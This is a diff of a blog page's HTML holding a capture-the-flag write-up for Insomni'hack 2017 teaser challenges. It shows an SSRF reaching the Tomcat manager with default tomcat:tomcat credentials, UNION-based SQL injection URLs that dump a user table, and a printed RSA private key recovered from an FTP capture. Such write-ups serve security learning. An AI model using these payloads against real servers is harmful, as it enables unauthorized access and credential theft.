@@ -130,30 +130,30 @@ following:</p>
 <span class="code-line"></code></pre></div>
 
 <p>We notice the <code>u</code> parameter which decoded is:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c">http://localhost:8080/index.jsp?x=42&amp;y=42</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>http://localhost:8080/index.jsp?x=42&amp;y=42</span>
 <span class="code-line"></code></pre></div>
 
 <p>The server is using itself as a proxy, When modifying the request with a <code>lol</code>,
 the <code>u</code> parameter is the following:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><code><span class="err">u=http%3A%2F%2Flocalhost%3A8080%2Flol</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>u=http%3A%2F%2Flocalhost%3A8080%2Flol</span>
 <span class="code-line"></code></pre></div>
 
 <p>The server response is an error which indicate us that the server is using a
 tomcat server 7.0.68.</p>
 <p><img alt="testing a bad request" src="/media/2017.01/lol.png"></p>
 <p>We learned that this is a tomcat server, so let's see if we can get the manager:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><code><span class="err">u=http%3A%2F%2Flocalhost%3A8080%2Fmanager/html/</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>u=http%3A%2F%2Flocalhost%3A8080%2Fmanager/html/</span>
 <span class="code-line"></code></pre></div>
 
 <p><img alt="authentication error on tomcat manager" src="/media/2017.01/manager.png"></p>
 <p>Tomcat manager used a HTTP basic auth, and we can authenticate with a URL looking
 like <code>http://username:password@site.com</code> so with the following parameter we test
 the default user and password for tomcat manager:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><code><span class="err">u=http%3A%2F%2Ftomcat:tomcat@localhost%3A8080%2Fmanager/html</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">u</span><span class="o">=</span><span class="n">http</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">2</span><span class="n">F</span><span class="o">%</span><span class="mi">2</span><span class="nl">Ftomcat</span><span class="p">:</span><span class="n">tomcat</span><span class="nv">@localhost</span><span class="o">%</span><span class="mi">3</span><span class="n">A8080</span><span class="o">%</span><span class="mi">2</span><span class="n">Fmanager</span><span class="o">/</span><span class="n">html</span><span class="w"></span></span>
 <span class="code-line"></code></pre></div>
 
 <p>The response is the following:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><code><span class="err">We won&#39;t give you the manager, but you can have the flag : INS{th1s_is_re4l_w0rld_pent3st}</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>We won&#39;t give you the manager, but you can have the flag : INS{th1s_is_re4l_w0rld_pent3st}</span>
 <span class="code-line"></code></pre></div>
 
 <h2 id="cryptquizz">Cryptquizz</h2>
@@ -362,22 +362,22 @@ script:</p>
 
 <p>The we can test slowly each parameter.</p>
 <p>There seems to be an injection on the parameter id of the article page.</p>
-<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c">http://shobot.teaser.insomnihack.ch/?page=article&amp;artid=4%27%20%20union%20select%201,2,3,4,5%20%23</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>http://shobot.teaser.insomnihack.ch/?page=article&amp;artid=4%27%20%20union%20select%201,2,3,4,5%20%23</span>
 <span class="code-line"></code></pre></div>
 
 <p><img alt="shobot simple union sqli" src="/media/2017.01/sqli1.png"></p>
 <p>We search the back end database with the versions requests:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c">http://shobot.teaser.insomnihack.ch/?page=article&amp;artid=4%27%20%20union%20select%201,@@version,3,4,5%20%23</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">shobot</span><span class="p">.</span><span class="n">teaser</span><span class="p">.</span><span class="n">insomnihack</span><span class="p">.</span><span class="n">ch</span><span class="o">/</span><span class="vm">?</span><span class="n">page</span><span class="o">=</span><span class="n">article</span><span class="o">&amp;</span><span class="n">artid</span><span class="o">=</span><span class="mi">4</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">20</span><span class="ow">union</span><span class="o">%</span><span class="mi">20</span><span class="k">select</span><span class="o">%</span><span class="mi">201</span><span class="p">,</span><span class="nb">@@version</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">23</span><span class="w"></span></span>
 <span class="code-line"></code></pre></div>
 
 <p>So it is operated by a MySQL database. Then we need to fine the right table.</p>
 <p>The finale request is:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c">http://shobot.teaser.insomnihack.ch/?page=article&amp;artid=4%27%20%20union%20select%201,shbt_username,shbt_userpassword,4,5%20from%20shbt_user%23</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>http://shobot.teaser.insomnihack.ch/?page=article&amp;artid=4%27%20%20union%20select%201,shbt_username,shbt_userpassword,4,5%20from%20shbt_user%23</span>
 <span class="code-line"></code></pre></div>
 
 <p>Then we need to authenticate, on the admin page, using the direct URL but
 authenticating as for the Smartomcat challenge just worked:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><code><span class="c">http://sh0b0t4dm1n:N0T0R0B0TS$L4V3Ry@shobot.teaser.insomnihack.ch/?page=admin</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="nl">sh0b0t4dm1n</span><span class="p">:</span><span class="n">N0T0R0B0TS</span><span class="err">$</span><span class="n">L4V3Ry</span><span class="nv">@shobot</span><span class="p">.</span><span class="n">teaser</span><span class="p">.</span><span class="n">insomnihack</span><span class="p">.</span><span class="n">ch</span><span class="o">/</span><span class="vm">?</span><span class="n">page</span><span class="o">=</span><span class="k">admin</span><span class="w"></span></span>
 <span class="code-line"></code></pre></div>
 
 <p>And give us the flag:</p>
@@ -440,7 +440,7 @@ authenticating as for the Smartomcat challenge just worked:</p>
 TCP stream we got:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">FTP</span><span class="w"> </span><span class="nl">flow</span><span class="p">:</span><span class="w"></span></span>
 <span class="code-line"></span>
-<span class="code-line"><span class="mi">220</span><span class="c1">---------- Welcome to Pure-FTPd [privsep] [TLS] ----------</span></span>
+<span class="code-line"><span class="mi">220</span><span class="o">----------</span><span class="w"> </span><span class="n">Welcome</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">Pure</span><span class="o">-</span><span class="n">FTPd</span><span class="w"> </span><span class="o">[</span><span class="n">privsep</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">TLS</span><span class="o">]</span><span class="w"> </span><span class="o">----------</span><span class="w"></span></span>
 <span class="code-line"><span class="mi">220</span><span class="o">-</span><span class="n">You</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="n">number</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">allowed</span><span class="p">.</span><span class="w"></span></span>
 <span class="code-line"><span class="mi">220</span><span class="o">-</span><span class="k">Local</span><span class="w"> </span><span class="nc">time</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="mi">11</span><span class="err">:</span><span class="mf">51.</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="nl">port</span><span class="p">:</span><span class="w"> </span><span class="mf">21.</span><span class="w"></span></span>
 <span class="code-line"><span class="mi">220</span><span class="o">-</span><span class="n">This</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">private</span><span class="w"> </span><span class="k">system</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">anonymous</span><span class="w"> </span><span class="n">login</span><span class="w"></span></span>
@@ -468,58 +468,58 @@ TCP stream we got:</p>
 <p><img alt="pcap screenshot" src="/media/2017.01/capture.png"></p>
 <p>STOR is for transfer file, it seems that a key is transfered. We follow the TCP
 stream and get the RSA private key:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><code><span class="err">-----BEGIN PRIVATE KEY-----</span></span>
-<span class="code-line"><span class="err">MIIJQwIBADANBgkqhkiG9w0BAQEFAASCCS0wggkpAgEAAoICAQC5twyPH+2U6X0Q</span></span>
-<span class="code-line"><span class="err">uxOKPTHSR6MkXGSvAz+Ax+G9DKEiBLuTTfl7dNv4oswdmT9nWlSY1kxZatNwlUF8</span></span>
-<span class="code-line"><span class="err">WAuGLntO5xTEmOJlMtBFrWGD+DVpCE9KORGvyif8e4xxi6vh4mkW78IxV03VxHM0</span></span>
-<span class="code-line"><span class="err">mk/cq5kkERfWQW81pVeYm9UAm4dj+LcCwQ9aGd/vfTtcACqS5OGtELFbsHJuFVyn</span></span>
-<span class="code-line"><span class="err">srpp4K6tLtRk2ensSnmXUXNEjqpodfdb/wqGT86NYg7i6d/4Rqa440a6BD7RKrgp</span></span>
-<span class="code-line"><span class="err">YPaXl7pQusemHQPd248fxsuEfEwhPNDJhIb8fDX9BWv2xTfBLhGwOh7euzSh2C4o</span></span>
-<span class="code-line"><span class="err">KSuBAO+bIkL+pGY1z7DFtuJYfTOSJyQ5zQzToxS+jE+2x9/3GpD2LUD0xkA8bWhv</span></span>
-<span class="code-line"><span class="err">eecq0v6ZWBVYNX54V5ME3s2qxYc6CSQhi6Moy8xWlcSpTSAa7voNQNa9RvQ4/3KF</span></span>
-<span class="code-line"><span class="err">3gCbKtFvdd7IHvxfn8vcCrCZ37eVkq0Fl1y5UNeJU/Y0Tt8m7UDn3uKNpB841BQa</span></span>
-<span class="code-line"><span class="err">hiGayCSjsHuTS8B+MnpnzWCrzD+rAzCB37B599iBK4t/mwSIZZUZaqxTWNoFS2Lz</span></span>
-<span class="code-line"><span class="err">7m0LumZ4Yk8DpDEuWhNs8OUD8FsgAvWFVAvivaaAciF3kMs8pkmNTs2LFBowOshz</span></span>
-<span class="code-line"><span class="err">SXfONsHupgXEwwFrKOOZXNhb+O/WKQIDAQABAoICAAT6mFaZ94efft/c9BgnrddC</span></span>
-<span class="code-line"><span class="err">XmhSJczfXGt6cF3eIc/Eqra3R3H83wzaaHh+rEl8DXqPfDqFd6e0CK5pud1eD6Y8</span></span>
-<span class="code-line"><span class="err">4bynkKI/63+Ct3OPSvdG5sFJqGS7GblWIpzErtX+eOzJfr5N5eNOQfxuCqgS3acu</span></span>
-<span class="code-line"><span class="err">4iG3XWDlzuRjgSFkCgwvFdD4Fg5HVU6ZX+cGhh2sDzTRlr+rilXTMsm4K/E8udIg</span></span>
-<span class="code-line"><span class="err">yEbv5KqWEI5y+5Eh9gWY7AnGW6TgLNxzfYyt0nhYhI2+Yh4IkRqQd6F8XQARbEhP</span></span>
-<span class="code-line"><span class="err">yZx1eK4Q/dRPQxOJNY1KkRpl+Cx6tAPVimByRx1hu82qsTstb6rLHemruOPbf5Dw</span></span>
-<span class="code-line"><span class="err">aqgSFdp7it3uqjJHCwJ2hAZoijAcvlhn1sa1hr/qFFlY/WeDAi8OyvGdCSh3OvS6</span></span>
-<span class="code-line"><span class="err">yazkah85GOnY85rz+s98F9cvIqcRdGJrAeNbUHHnj6+X9qFVtwDpF0V1vlvn2Ggp</span></span>
-<span class="code-line"><span class="err">7m8hiZ0Y+8T+7qfnS9WsdPh7MkoIEoZ0CPryYvX+YPLYWqzxtCvrRWF8tAScI6H+</span></span>
-<span class="code-line"><span class="err">XBz3NlCAUaOk+ZOkKlZ8ZYMSn/g5EV2jj/mwZVdtYoeQjLaCDuLq8E1Hswnpgq7F</span></span>
-<span class="code-line"><span class="err">54hHU7vOeJ1/TQltLCNfJFQRaUD+tPz9R6jVpbqBiXxIC2eiGTo1rP4Ii7hsQRFC</span></span>
-<span class="code-line"><span class="err">W0KKqu+bV69HJAmi06yBAoIBAQDvz+c+3z9njQFFaeUUqyzl31HOzRHmWhJEoriR</span></span>
-<span class="code-line"><span class="err">nRhWTLzqMyn+RLGrD3DJQj/dGH6tyxHJ7PdI7gtJ3qaF4lCc2dKR3uQW3CBKI9Ys</span></span>
-<span class="code-line"><span class="err">wzjBWOTijafbttXHanXEwXR3vnPk+sH52BqTXZQVA5vzPwIPJnz3H6E9hL66b/uM</span></span>
-<span class="code-line"><span class="err">DS9owYRBmykXlV9Gt91Vl5cpg3yxPixaeLMhqDD2Ebq6OFyuacExQHfGUeP0Va/A</span></span>
-<span class="code-line"><span class="err">IdM9+H5DE13qR2INX+N0kAFyFzW7k8AvY37KGZdoACUrDzmmGoilfs/pFAC0kZaZ</span></span>
-<span class="code-line"><span class="err">tKXoR9iLNxWSBtlI2Fr3qz4gc5nItYb7JSQsdu6Lc92+9z4xAoIBAQDGQFDXVQyk</span></span>
-<span class="code-line"><span class="err">Q5tsWicru5v2c9VoFpLUtBg4Dx3uXOMEVl/S5hZ8jYbUH4dcwKyLCYQLtNSc9aei</span></span>
-<span class="code-line"><span class="err">8zm18TdOGm0nCLOo7OPMeet+JHyx8uz1l/Sx4ucI/Jq3yVSTqdtXYakxzijTldNQ</span></span>
-<span class="code-line"><span class="err">M7YnjpBcs0yDk806R7J3xvxZNMbElQH1bP947Ej0sv40cBcA0hdpjuuNI5C2Ot4P</span></span>
-<span class="code-line"><span class="err">fUZXfqR34L7aPZPuP82W2WqFgkTyMY8FO235qR+Sy5xrcHSS4L1FdF+PhS5ZjiPN</span></span>
-<span class="code-line"><span class="err">sUdXRvfNFQlKZRUyqB147XY7EDnx6BZW2aoM7AiYPiGhxZeV4NHy1ChdBO2CSmOA</span></span>
-<span class="code-line"><span class="err">03FvucMEmUF5AoIBAD2xorAOBuXA5L7Sy1hR4S8SEJ2/LAeyzFhT9F+hpo0tGLy3</span></span>
-<span class="code-line"><span class="err">hOohCgQT6NQd8wgSMSTMxTrJd6SPeN/8I6L14f84Gm/kg5FN+BCav5KsdoFnORr/</span></span>
-<span class="code-line"><span class="err">jlt74et3e+yuSCQ2HuKdkCGScuPOgzYUw54Ea6cyI5v/yx9kcxzLik8xZSzx+/BU</span></span>
-<span class="code-line"><span class="err">1nF2wBgVXR+T7BOF/CIs+IQd4RebiV0EmqElttI36rec+jNPBfHpyVkIWqvqrbDb</span></span>
-<span class="code-line"><span class="err">3qFS0+rU7FMkaPrM9cnX7O1ED242vzjGMMmvFQmicd0BjsNLnhLWEYRhcP0c3pyS</span></span>
-<span class="code-line"><span class="err">Az6Z/HQ9FMn6h/UZSErWSG970p6NyjieCkICoUECggEBALdyXhvTPD5nvNL3XRWv</span></span>
-<span class="code-line"><span class="err">pXLY3plRgg7Gkz6UZmrhksO5tTOu6xHX1/JDNntSYpbJeGFos/CFs9gp3rYH/dgM</span></span>
-<span class="code-line"><span class="err">xgH/oFdo1KWqD4oK80OqeTAMq0VLo+OB8xyrdNKqsydZXDmU/dxD4GRvZVeXKOhO</span></span>
-<span class="code-line"><span class="err">lTePtbD/FRqWi310Q5U2GLjkYkWfxyZ+1pDpQ6/jt/xaXoacaVTmhgKpNkTSEBhJ</span></span>
-<span class="code-line"><span class="err">Y/EIV/F3IqM6jcH6uBewWhpKUspZf7jTJeuZBJXA1gMF20MvxqLhzymPqGcPaU9g</span></span>
-<span class="code-line"><span class="err">7tbjUEkunQ8AFI40xpmc28cD5MHOS2ms3GwYLdtnTH65aJwiajBM62QSw/3RU67W</span></span>
-<span class="code-line"><span class="err">rWkCggEBAOtMBi9ko4ZR96BCFcuyPsiMcoDBQBEFgH/drT3hMlwmmVt5dcInw3Zk</span></span>
-<span class="code-line"><span class="err">DQb3gIWHP1Ul//Ma8qwSeuIua0+6wkQ3NcsDywlJ2cqfZUe7kVJTCl8fuudTAYqT</span></span>
-<span class="code-line"><span class="err">Bs5Y1ktYPSyQOxmidMeX5IcGe5fPSdpFu9wMXXQ31l8o9SzccFKwz1P1o8G00xvx</span></span>
-<span class="code-line"><span class="err">wtcfAZ204Dcrdfm6xTWmzMrHqngS1uUDOJbW175gQqeAszy8wLMz41Yau3ypk3ga</span></span>
-<span class="code-line"><span class="err">edWr4Hzbiph0V1Dv/V+kmmreWBmHetH6bhrTWQq3UZ5WbGMpiTmSsD0EXU5vZLbX</span></span>
-<span class="code-line"><span class="err">xmZSEXjNvG9grjxwR96vp1PK/4Bq1jo=</span></span>
-<span class="code-line"><span class="err">-----END PRIVATE KEY-----</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="o">-----</span><span class="kr">BEGIN</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span></span>
+<span class="code-line"><span class="n">MIIJQwIBADANBgkqhkiG9w0BAQEFAASCCS0wggkpAgEAAoICAQC5twyPH</span><span class="o">+</span><span class="mi">2</span><span class="n">U6X0Q</span></span>
+<span class="code-line"><span class="n">uxOKPTHSR6MkXGSvAz</span><span class="o">+</span><span class="n">Ax</span><span class="o">+</span><span class="n">G9DKEiBLuTTfl7dNv4oswdmT9nWlSY1kxZatNwlUF8</span></span>
+<span class="code-line"><span class="n">WAuGLntO5xTEmOJlMtBFrWGD</span><span class="o">+</span><span class="n">DVpCE9KORGvyif8e4xxi6vh4mkW78IxV03VxHM0</span></span>
+<span class="code-line"><span class="n">mk</span><span class="o">/</span><span class="n">cq5kkERfWQW81pVeYm9UAm4dj</span><span class="o">+</span><span class="n">LcCwQ9aGd</span><span class="o">/</span><span class="n">vfTtcACqS5OGtELFbsHJuFVyn</span></span>
+<span class="code-line"><span class="n">srpp4K6tLtRk2ensSnmXUXNEjqpodfdb</span><span class="o">/</span><span class="n">wqGT86NYg7i6d</span><span class="o">/</span><span class="mi">4</span><span class="n">Rqa440a6BD7RKrgp</span></span>
+<span class="code-line"><span class="n">YPaXl7pQusemHQPd248fxsuEfEwhPNDJhIb8fDX9BWv2xTfBLhGwOh7euzSh2C4o</span></span>
+<span class="code-line"><span class="n">KSuBAO</span><span class="o">+</span><span class="n">bIkL</span><span class="o">+</span><span class="n">pGY1z7DFtuJYfTOSJyQ5zQzToxS</span><span class="o">+</span><span class="n">jE</span><span class="o">+</span><span class="mi">2</span><span class="n">x9</span><span class="o">/</span><span class="mi">3</span><span class="n">GpD2LUD0xkA8bWhv</span></span>
+<span class="code-line"><span class="n">eecq0v6ZWBVYNX54V5ME3s2qxYc6CSQhi6Moy8xWlcSpTSAa7voNQNa9RvQ4</span><span class="o">/</span><span class="mi">3</span><span class="n">KF</span></span>
+<span class="code-line"><span class="mi">3</span><span class="n">gCbKtFvdd7IHvxfn8vcCrCZ37eVkq0Fl1y5UNeJU</span><span class="o">/</span><span class="n">Y0Tt8m7UDn3uKNpB841BQa</span></span>
+<span class="code-line"><span class="n">hiGayCSjsHuTS8B</span><span class="o">+</span><span class="n">MnpnzWCrzD</span><span class="o">+</span><span class="n">rAzCB37B599iBK4t</span><span class="o">/</span><span class="n">mwSIZZUZaqxTWNoFS2Lz</span></span>
+<span class="code-line"><span class="mi">7</span><span class="n">m0LumZ4Yk8DpDEuWhNs8OUD8FsgAvWFVAvivaaAciF3kMs8pkmNTs2LFBowOshz</span></span>
+<span class="code-line"><span class="n">SXfONsHupgXEwwFrKOOZXNhb</span><span class="o">+</span><span class="n">O</span><span class="o">/</span><span class="n">WKQIDAQABAoICAAT6mFaZ94efft</span><span class="o">/</span><span class="n">c9BgnrddC</span></span>
+<span class="code-line"><span class="n">XmhSJczfXGt6cF3eIc</span><span class="o">/</span><span class="n">Eqra3R3H83wzaaHh</span><span class="o">+</span><span class="n">rEl8DXqPfDqFd6e0CK5pud1eD6Y8</span></span>
+<span class="code-line"><span class="mi">4</span><span class="n">bynkKI</span><span class="o">/</span><span class="mi">63</span><span class="o">+</span><span class="n">Ct3OPSvdG5sFJqGS7GblWIpzErtX</span><span class="o">+</span><span class="n">eOzJfr5N5eNOQfxuCqgS3acu</span></span>
+<span class="code-line"><span class="mi">4</span><span class="n">iG3XWDlzuRjgSFkCgwvFdD4Fg5HVU6ZX</span><span class="o">+</span><span class="n">cGhh2sDzTRlr</span><span class="o">+</span><span class="n">rilXTMsm4K</span><span class="o">/</span><span class="n">E8udIg</span></span>
+<span class="code-line"><span class="n">yEbv5KqWEI5y</span><span class="o">+</span><span class="mi">5</span><span class="n">Eh9gWY7AnGW6TgLNxzfYyt0nhYhI2</span><span class="o">+</span><span class="n">Yh4IkRqQd6F8XQARbEhP</span></span>
+<span class="code-line"><span class="n">yZx1eK4Q</span><span class="o">/</span><span class="n">dRPQxOJNY1KkRpl</span><span class="o">+</span><span class="n">Cx6tAPVimByRx1hu82qsTstb6rLHemruOPbf5Dw</span></span>
+<span class="code-line"><span class="n">aqgSFdp7it3uqjJHCwJ2hAZoijAcvlhn1sa1hr</span><span class="o">/</span><span class="n">qFFlY</span><span class="o">/</span><span class="n">WeDAi8OyvGdCSh3OvS6</span></span>
+<span class="code-line"><span class="n">yazkah85GOnY85rz</span><span class="o">+</span><span class="n">s98F9cvIqcRdGJrAeNbUHHnj6</span><span class="o">+</span><span class="n">X9qFVtwDpF0V1vlvn2Ggp</span></span>
+<span class="code-line"><span class="mi">7</span><span class="n">m8hiZ0Y</span><span class="o">+</span><span class="mi">8</span><span class="n">T</span><span class="o">+</span><span class="mi">7</span><span class="n">qfnS9WsdPh7MkoIEoZ0CPryYvX</span><span class="o">+</span><span class="n">YPLYWqzxtCvrRWF8tAScI6H</span><span class="o">+</span></span>
+<span class="code-line"><span class="n">XBz3NlCAUaOk</span><span class="o">+</span><span class="n">ZOkKlZ8ZYMSn</span><span class="o">/</span><span class="n">g5EV2jj</span><span class="o">/</span><span class="n">mwZVdtYoeQjLaCDuLq8E1Hswnpgq7F</span></span>
+<span class="code-line"><span class="mi">54</span><span class="n">hHU7vOeJ1</span><span class="o">/</span><span class="n">TQltLCNfJFQRaUD</span><span class="o">+</span><span class="n">tPz9R6jVpbqBiXxIC2eiGTo1rP4Ii7hsQRFC</span></span>
+<span class="code-line"><span class="n">W0KKqu</span><span class="o">+</span><span class="n">bV69HJAmi06yBAoIBAQDvz</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="mi">3</span><span class="n">z9njQFFaeUUqyzl31HOzRHmWhJEoriR</span></span>
+<span class="code-line"><span class="n">nRhWTLzqMyn</span><span class="o">+</span><span class="n">RLGrD3DJQj</span><span class="o">/</span><span class="n">dGH6tyxHJ7PdI7gtJ3qaF4lCc2dKR3uQW3CBKI9Ys</span></span>
+<span class="code-line"><span class="n">wzjBWOTijafbttXHanXEwXR3vnPk</span><span class="o">+</span><span class="n">sH52BqTXZQVA5vzPwIPJnz3H6E9hL66b</span><span class="o">/</span><span class="n">uM</span></span>
+<span class="code-line"><span class="n">DS9owYRBmykXlV9Gt91Vl5cpg3yxPixaeLMhqDD2Ebq6OFyuacExQHfGUeP0Va</span><span class="o">/</span><span class="n">A</span></span>
+<span class="code-line"><span class="n">IdM9</span><span class="o">+</span><span class="n">H5DE13qR2INX</span><span class="o">+</span><span class="n">N0kAFyFzW7k8AvY37KGZdoACUrDzmmGoilfs</span><span class="o">/</span><span class="n">pFAC0kZaZ</span></span>
+<span class="code-line"><span class="n">tKXoR9iLNxWSBtlI2Fr3qz4gc5nItYb7JSQsdu6Lc92</span><span class="o">+</span><span class="mi">9</span><span class="n">z4xAoIBAQDGQFDXVQyk</span></span>
+<span class="code-line"><span class="n">Q5tsWicru5v2c9VoFpLUtBg4Dx3uXOMEVl</span><span class="o">/</span><span class="n">S5hZ8jYbUH4dcwKyLCYQLtNSc9aei</span></span>
+<span class="code-line"><span class="mi">8</span><span class="n">zm18TdOGm0nCLOo7OPMeet</span><span class="o">+</span><span class="n">JHyx8uz1l</span><span class="o">/</span><span class="n">Sx4ucI</span><span class="o">/</span><span class="n">Jq3yVSTqdtXYakxzijTldNQ</span></span>
+<span class="code-line"><span class="n">M7YnjpBcs0yDk806R7J3xvxZNMbElQH1bP947Ej0sv40cBcA0hdpjuuNI5C2Ot4P</span></span>
+<span class="code-line"><span class="n">fUZXfqR34L7aPZPuP82W2WqFgkTyMY8FO235qR</span><span class="o">+</span><span class="n">Sy5xrcHSS4L1FdF</span><span class="o">+</span><span class="n">PhS5ZjiPN</span></span>
+<span class="code-line"><span class="n">sUdXRvfNFQlKZRUyqB147XY7EDnx6BZW2aoM7AiYPiGhxZeV4NHy1ChdBO2CSmOA</span></span>
+<span class="code-line"><span class="mi">03</span><span class="n">FvucMEmUF5AoIBAD2xorAOBuXA5L7Sy1hR4S8SEJ2</span><span class="o">/</span><span class="n">LAeyzFhT9F</span><span class="o">+</span><span class="n">hpo0tGLy3</span></span>
+<span class="code-line"><span class="n">hOohCgQT6NQd8wgSMSTMxTrJd6SPeN</span><span class="o">/</span><span class="mi">8</span><span class="n">I6L14f84Gm</span><span class="o">/</span><span class="n">kg5FN</span><span class="o">+</span><span class="n">BCav5KsdoFnORr</span><span class="o">/</span></span>
+<span class="code-line"><span class="n">jlt74et3e</span><span class="o">+</span><span class="n">yuSCQ2HuKdkCGScuPOgzYUw54Ea6cyI5v</span><span class="o">/</span><span class="n">yx9kcxzLik8xZSzx</span><span class="o">+/</span><span class="n">BU</span></span>
+<span class="code-line"><span class="mi">1</span><span class="n">nF2wBgVXR</span><span class="o">+</span><span class="n">T7BOF</span><span class="o">/</span><span class="n">CIs</span><span class="o">+</span><span class="n">IQd4RebiV0EmqElttI36rec</span><span class="o">+</span><span class="n">jNPBfHpyVkIWqvqrbDb</span></span>
+<span class="code-line"><span class="mi">3</span><span class="n">qFS0</span><span class="o">+</span><span class="n">rU7FMkaPrM9cnX7O1ED242vzjGMMmvFQmicd0BjsNLnhLWEYRhcP0c3pyS</span></span>
+<span class="code-line"><span class="n">Az6Z</span><span class="o">/</span><span class="n">HQ9FMn6h</span><span class="o">/</span><span class="n">UZSErWSG970p6NyjieCkICoUECggEBALdyXhvTPD5nvNL3XRWv</span></span>
+<span class="code-line"><span class="n">pXLY3plRgg7Gkz6UZmrhksO5tTOu6xHX1</span><span class="o">/</span><span class="n">JDNntSYpbJeGFos</span><span class="o">/</span><span class="n">CFs9gp3rYH</span><span class="o">/</span><span class="n">dgM</span></span>
+<span class="code-line"><span class="n">xgH</span><span class="o">/</span><span class="n">oFdo1KWqD4oK80OqeTAMq0VLo</span><span class="o">+</span><span class="n">OB8xyrdNKqsydZXDmU</span><span class="o">/</span><span class="n">dxD4GRvZVeXKOhO</span></span>
+<span class="code-line"><span class="n">lTePtbD</span><span class="o">/</span><span class="n">FRqWi310Q5U2GLjkYkWfxyZ</span><span class="o">+</span><span class="mi">1</span><span class="n">pDpQ6</span><span class="o">/</span><span class="n">jt</span><span class="o">/</span><span class="n">xaXoacaVTmhgKpNkTSEBhJ</span></span>
+<span class="code-line"><span class="n">Y</span><span class="o">/</span><span class="n">EIV</span><span class="o">/</span><span class="n">F3IqM6jcH6uBewWhpKUspZf7jTJeuZBJXA1gMF20MvxqLhzymPqGcPaU9g</span></span>
+<span class="code-line"><span class="mi">7</span><span class="n">tbjUEkunQ8AFI40xpmc28cD5MHOS2ms3GwYLdtnTH65aJwiajBM62QSw</span><span class="o">/</span><span class="mi">3</span><span class="n">RU67W</span></span>
+<span class="code-line"><span class="n">rWkCggEBAOtMBi9ko4ZR96BCFcuyPsiMcoDBQBEFgH</span><span class="o">/</span><span class="n">drT3hMlwmmVt5dcInw3Zk</span></span>
+<span class="code-line"><span class="n">DQb3gIWHP1Ul</span><span class="o">//</span><span class="n">Ma8qwSeuIua0</span><span class="o">+</span><span class="mi">6</span><span class="n">wkQ3NcsDywlJ2cqfZUe7kVJTCl8fuudTAYqT</span></span>
+<span class="code-line"><span class="n">Bs5Y1ktYPSyQOxmidMeX5IcGe5fPSdpFu9wMXXQ31l8o9SzccFKwz1P1o8G00xvx</span></span>
+<span class="code-line"><span class="n">wtcfAZ204Dcrdfm6xTWmzMrHqngS1uUDOJbW175gQqeAszy8wLMz41Yau3ypk3ga</span></span>
+<span class="code-line"><span class="n">edWr4Hzbiph0V1Dv</span><span class="o">/</span><span class="n">V</span><span class="o">+</span><span class="n">kmmreWBmHetH6bhrTWQq3UZ5WbGMpiTmSsD0EXU5vZLbX</span></span>
+<span class="code-line"><span class="n">xmZSEXjNvG9grjxwR96vp1PK</span><span class="o">/</span><span class="mi">4</span><span class="n">Bq1jo</span><span class="o">=</span></span>
+<span class="code-line"><span class="o">-----</span><span class="kr">END</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span></span>
 <span class="code-line"></code></pre></div>
 
 <p>We <a href="https://blogs.technet.microsoft.com/nettracer/2013/10/12/decrypting-ssltls-sessions-with-wireshark-reloaded/">import the key in wireshark</a>
@@ -626,109 +626,142 @@ the file send by Rogue. But the file is encrypted. This is part 2.</p>
 
     <ul>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/web.html">web</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/logrotate.html">logrotate</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/htb.html">HTB</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/code-review.html">code review</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/re.html">RE</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/net.html">.NET</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/laravel.html">laravel</a>
